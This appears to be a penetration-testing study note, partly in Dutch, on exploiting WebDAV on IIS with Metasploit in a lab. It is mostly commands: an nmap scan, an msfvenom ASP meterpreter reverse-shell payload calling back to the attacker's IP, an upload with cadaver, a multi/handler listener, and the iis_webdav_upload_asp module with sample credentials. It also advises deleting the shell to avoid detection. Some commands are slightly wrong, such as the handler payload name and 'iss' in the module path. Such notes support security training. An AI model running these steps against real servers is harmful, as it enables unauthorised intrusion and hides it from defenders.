
Exploiting WebDAV With Metasploit 

- Start with nmap scan on target to confirm that IIS is running and WebDav is configured 
	- *nmap -sV -p 80 --script=http-enum target* 
- Now lets try to start with a meterpreter session (reverse shell) 
	- MSFvenom is a tool that allows you to generate a payload that provide you with remote/remote access with system (Msfvenom can generate payloads in different formats, such as executable files, shellcode, dynamic-link libraries (DLLs), JavaScript, Python scripts, and more.) 
- *msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp* 
	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > meterpreter.asp 
		- - `msfvenom`: This is the command to execute the msfvenom tool.
		- `-p windows/meterpreter/reverse_tcp`: This parameter specifies the payload to be generated. In this case, it is using the "meterpreter" payload, which is a versatile payload that provides advanced functionality and allows interactive control of the compromised system. It is designed for Windows targets and uses a reverse TCP connection.
		- `LHOST=10.10.5.2`: This parameter specifies the **local IP address (host)** for the reverse connection. You should replace it with the IP address of the system where the listener (the system that will receive the connection) is running. In this case, it is set to `10.10.5.2`.
		- `LPORT=1234`: This parameter specifies the **local port number** for the reverse connection. You should replace it with the port number where the listener is configured to listen for incoming connections. In this case, it is set to `1234`.
		- `-f asp`: This parameter specifies the output format for the generated payload. In this case, it is set to ASP (Active Server Pages). The generated payload will be in the form of an ASP script.
		- `> meterpreter.asp`: This part redirects the output of the msfvenom command to a file named "meterpreter.asp". The generated ASP payload will be saved in this file.
- use cadaver to get sudo shell: cadaver http://target-ip/webdav
	- 'ls' to list the files 
	- use **put** to upload the file that you created: put /root/meterpreter.asp 
- before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
	- start up metasploit framework console session: service postgresql start && msfconsole
		-  "service postgresql start": This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
			- PostgreSQL is one of the supported databases for Metasploit, and it can be used as a data store for various features and functionalities within the framework. By default, Metasploit uses an SQLite database, but using PostgreSQL can offer better performance and scalability, especially when dealing with larger datasets or multiple concurrent users.
			- The command "service postgresql start" is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
		-  "&&": This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
		- "msfconsole": This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
		- By combining these commands using "&&", the shell will start the PostgreSQL service and, if successful, proceed to launch the Metasploit Framework console.

- Setting up handler/listener in metasploit by using metasploit module : 
	- use multi/handler 
	- set payload windows/meterpreter/meterpreter.asp  (let op dat jouw payload naam overeenkomt met wat je hier invoert)
	- show options 
	- set LHOST  yourip
	- set LPORT  openport 
	- run 
- execute malicious payload by clicking on the file name in webdav browser 
- run sysinfo to see if it was successfull 
- run getuid to check your privileges 

delete shell.asp will delete the file, this is good to do once you have access, to avoid detection 

optie 2 in metasploit 

- search iis upload ![[Pasted image 20230703111527.png]]
- use exploit/windows/iss/iss_webdav_upload_asp 
	- show options 
	- set  HttpUsername bob  
	- set  HttpPassword password_123321
	- set RHOST 
	- set Rport 
	- set PATH /webdav/metasploit.asp  (this is what will be uploaded)
	- exploit (this will start reverse tcp handler)



------------------------- LAB -------------------------

![[Pasted image 20230703112538.png]] 

